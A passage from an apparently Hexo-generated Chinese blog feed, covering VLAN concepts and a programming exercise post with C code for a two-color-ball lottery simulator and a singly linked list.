VLAN允许网络管理员在单一物理网络中创建多个逻辑上独立的子网络，这样不同的设备可以在不同的逻辑网络中进行通信。</p></li><li><p><strong>灵活性：</strong> 设备的逻辑位置不再受限于它们在物理网络中的位置，而是由VLAN的配置确定。这使得设备可以按照逻辑需求而不是物理位置进行组织。</p></li><li><p><strong>安全性：</strong> VLAN可以提高网络的安全性，因为设备只能直接与同一VLAN中的设备进行通信。这有助于隔离不同的用户群体，提高网络的安全性。</p></li><li><p><strong>性能优化：</strong> 通过将广播域划分为不同的VLAN，减少了广播和多播的传播范围，提高了网络性能。</p></li><li><p><strong>透明性：</strong> 虽然VLAN划分了逻辑网络，但对用户和终端设备而言，这种划分是透明的，用户感知不到物理网络的变化。</p></li></ol><h4 id="工作原理：-2"><a href="#工作原理：-2" class="headerlink" title="工作原理："></a>工作原理：</h4><ol><li><p><strong>基于端口：</strong> 最简单的VLAN划分是基于交换机端口的。每个端口被分配到一个特定的VLAN，所有连接到该端口的设备都属于同一VLAN。</p></li><li><p><strong>基于MAC地址：</strong> 有些VLAN实现允许基于设备的MAC地址进行VLAN划分，即同一设备的所有端口可以属于同一VLAN。</p></li><li><p><strong>基于协议：</strong> VLAN还可以基于网络层协议进行划分，例如将所有IP电话设备划分到一个VLAN，将所有视频设备划分到另一个VLAN。</p></li><li><p><strong>标记帧：</strong> 802.1Q协议是一种常用的VLAN标记协议，它在以太网帧中添加一个额外的标签，表示该帧属于哪个VLAN。交换机根据这个标签将帧转发到正确的VLAN。</p></li><li><p><strong>路由：</strong> 虽然VLAN内部的设备可以直接通信，但如果需要不同VLAN之间的通信，就需要通过路由器进行。这样可以实现不同VLAN之间的隔离和控制通信的策略。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序设计综合训练</title>
      <link href="/2024/03/02/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E8%AE%AD%E7%BB%83/"/>
      <url>/2024/03/02/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E8%AE%AD%E7%BB%83/</url>
      
        <content type="html"><![CDATA[<h3 id="综合训练一：双色球"><a href="#综合训练一：双色球" class="headerlink" title="综合训练一：双色球"></a>综合训练一：双色球</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发者：C3ngH</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户输入双色球号码</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">inputInterface</span><span class="params">(<span class="type">int</span> *redBalls, <span class="type">int</span> *blueBall)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入六个红色球号码：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;redBalls[i]);</span><br><span class="line">        <span class="comment">// 确认输入范围合法性</span></span><br><span class="line">        <span class="keyword">if</span> (redBalls[i] &lt; <span class="number">1</span> || redBalls[i] &gt; <span class="number">33</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入出错,红色球范围必须在1到33\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//查重</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (redBalls[j] == redBalls[i]) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;输入出错,红色球号码不能重复\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入一个蓝色球号码：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, blueBall);</span><br><span class="line">    <span class="comment">// 确认输入范围合法性</span></span><br><span class="line">    <span class="keyword">if</span> (*blueBall &lt; <span class="number">1</span> || *blueBall &gt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;输入出错,蓝色球范围必须在1到16\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机生成中奖号码</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">lotterySimulation</span><span class="params">(<span class="type">int</span> *winningRedBalls, <span class="type">int</span> *winningBlueBall)</span> &#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));  <span class="comment">//修改种子</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    // 随机生成红色球号码</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; 6; i++) &#123;</span></span><br><span class="line"><span class="comment">        winningRedBalls[i] = rand() % 33 + 1;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    //查重</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; 6; i++) &#123;</span></span><br><span class="line"><span class="comment">        for (int j = 0; j &lt; i; j++) &#123;</span></span><br><span class="line"><span class="comment">            if (winningRedBalls[i] == winningRedBalls[j]) &#123;</span></span><br><span class="line"><span class="comment">                i--;</span></span><br><span class="line"><span class="comment">                break;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 随机生成红色球号码</span></span><br><span class="line">    <span class="type">bool</span> chosen[<span class="number">34</span>] = &#123;<span class="literal">false</span>&#125;; <span class="comment">// 初始化布尔数组，O(1)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> ball;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            ball = rand() % <span class="number">33</span> + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (chosen[ball]); <span class="comment">// 如果这个号码已经被选中，就重新生成</span></span><br><span class="line">        winningRedBalls[i] = ball;</span><br><span class="line">        chosen[ball] = <span class="literal">true</span>; <span class="comment">// 标记这个号码已经被选中</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 随机生成蓝色球号码</span></span><br><span class="line">    *winningBlueBall = rand() % <span class="number">16</span> + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输出生成的号码</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;生成的中奖号码为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, winningRedBalls[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;蓝色球：%d\n&quot;</span>, *winningBlueBall);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查中奖情况</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">checkWinning</span><span class="params">(<span class="type">int</span> *redBalls, <span class="type">int</span> blueBall, <span class="type">int</span> *winningRedBalls, <span class="type">int</span> winningBlueBall)</span> &#123;</span><br><span class="line">    <span class="type">int</span> RedFlag = <span class="number">0</span>, BlueFlag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 比较红色球号码</span></span><br><span class="line">    <span class="type">int</span> redBallsCount[<span class="number">34</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 桶排序数组，用于统计红色球的个数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 统计用户选择的红色球个数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        redBallsCount[redBalls[i]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//统计中奖红色球</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        redBallsCount[winningRedBalls[i]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 比较用户选择的红色球和中奖红色球</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (redBallsCount[winningRedBalls[i]] == <span class="number">2</span>) &#123;</span><br><span class="line">            RedFlag++;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较蓝色球号码</span></span><br><span class="line">    <span class="keyword">if</span> (blueBall != winningBlueBall) &#123;</span><br><span class="line">        BlueFlag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (RedFlag == <span class="number">6</span> &amp;&amp; BlueFlag == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (RedFlag == <span class="number">6</span> &amp;&amp; BlueFlag == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (RedFlag == <span class="number">5</span> &amp;&amp; BlueFlag == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (RedFlag == <span class="number">5</span> &amp;&amp; BlueFlag == <span class="number">0</span> || RedFlag == <span class="number">4</span> &amp;&amp; BlueFlag == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (RedFlag == <span class="number">4</span> &amp;&amp; BlueFlag == <span class="number">0</span> || RedFlag == <span class="number">3</span> &amp;&amp; BlueFlag == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (RedFlag == <span class="number">2</span> &amp;&amp; BlueFlag == <span class="number">1</span> || RedFlag == <span class="number">1</span> &amp;&amp; BlueFlag == <span class="number">1</span> || RedFlag == <span class="number">0</span> &amp;&amp; BlueFlag == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示中奖信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">displayWinningInfo</span><span class="params">(<span class="type">int</span> *redBalls, <span class="type">int</span> blueBall, <span class="type">int</span> *winningRedBalls, <span class="type">int</span> winningBlueBall, <span class="type">int</span> result)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;你选择的红色球号码：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, redBalls[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;你选择的蓝色球号码： %d\n&quot;</span>, blueBall);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;红色球中奖号码: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, winningRedBalls[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;蓝色球中奖号码： %d\n&quot;</span>, winningBlueBall);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;中了%d等奖\n&quot;</span>, result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;没有中奖\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> redBalls[<span class="number">6</span>];</span><br><span class="line">    <span class="type">int</span> blueBall;</span><br><span class="line">    <span class="type">int</span> winningRedBalls[<span class="number">6</span>];</span><br><span class="line">    <span class="type">int</span> winningBlueBall;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//inputInterface(redBalls, &amp;blueBall);</span></span><br><span class="line">    <span class="comment">//lotterySimulation(winningRedBalls, &amp;winningBlueBall);</span></span><br><span class="line">    lotterySimulation(winningRedBalls, &amp;winningBlueBall);</span><br><span class="line">    inputInterface(redBalls, &amp;blueBall);</span><br><span class="line">    result = checkWinning(redBalls, blueBall, winningRedBalls, winningBlueBall);</span><br><span class="line">    displayWinningInfo(redBalls, blueBall, winningRedBalls, winningBlueBall, result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>桶排序：</strong></li></ul><p>​相关链接：<a href="https://c3ngh.top/2023/12/06/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/">十大经典排序算法 | C3ngH’s B10g</a></p><h3 id="综合训练二：单链表和结构体数组"><a href="#综合训练二：单链表和结构体数组" class="headerlink" title="综合训练二：单链表和结构体数组"></a>综合训练二：单链表和结构体数组</h3><ul><li>单链表：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发者：C3ngH</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">createList</span><span class="params">(<span class="type">int</span> data)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">newNode</span> =</span> (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        head = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> Node* temp = head;</span><br><span class="line">        <span class="keyword">while</span> (temp-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        temp-&gt;next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insertNode</span><span class="params">(<span class="type">int</span> position, <span class="type">int</span> data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (position &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;错误的位置。\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">newNode</span> =</span> (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (position == <span class="number">0</span>) &#123;</span><br><span class="line">        newNode-&gt;next = head;</span><br><span class="line">        head = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> Node* temp = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; position - <span class="number">1</span> &amp;&amp; temp != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;错误的位置。\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        newNode-&gt;next = temp-&gt;next;</span><br><span class="line">        temp-&gt;next = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除节点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">deleteNode</span><span class="params">(<span class="type">int</span> position)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链表为空。\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (position == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span> =</span> head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> Node* temp = head;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">prev</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; position &amp;&amp; temp != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">            prev = temp;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;错误的位置。\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        prev-&gt;next = temp-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找节点</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">searchNode</span><span class="params">(<span class="type">int</span> data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链表为空。\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span> =</span> head;</span><br><span class="line">    <span class="type">int</span> position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (temp-&gt;data == data) &#123;</span><br><span class="line">            <span class="keyword">return</span> position;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = 